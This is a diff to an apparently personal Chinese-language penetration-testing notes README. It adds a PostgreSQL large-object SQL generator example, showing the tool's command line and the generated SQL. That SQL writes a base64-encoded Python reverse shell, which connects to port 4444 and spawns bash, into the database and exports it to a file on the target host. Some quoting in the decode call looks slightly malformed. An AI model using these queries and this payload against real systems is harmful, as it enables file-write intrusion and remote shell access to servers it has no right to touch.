@@ -15,6 +15,15 @@
 
 自己刻的BST Boolean-based SQLi
 
+Postgresql Large Object 的 SQL 語法產生器
+```sql
+$ python sqli/pgsql/generate_sql.py --noloid --upload revshells/r.py -p d:/go.py 
+select lo_import( 'c:/windows/win.ini', (select case when count (*) > 0 then MAX(CAST(loid as int))+1 else 1337 end from pg_largeobject));
+with LL as (select MAX(CAST(loid as int)) as gg from pg_largeobject) update pg_largeobject set data=decode('b'aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEyNy4wLjAuMSIsNDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oIi9iaW4vYmFzaCIpCg=='', 'base64') from LL where loid=LL.gg and pageno=0;
+select lo_export((select MAX(CAST(loid as int)) as gg from pg_largeobject), 'd:/go.py');
+select lo_unlink((select MAX(CAST(loid as int)) as gg from pg_largeobject));
+```
+
 ## ssti
 
 練習時有遇到的 SSTI, 記錄簡單復現方式
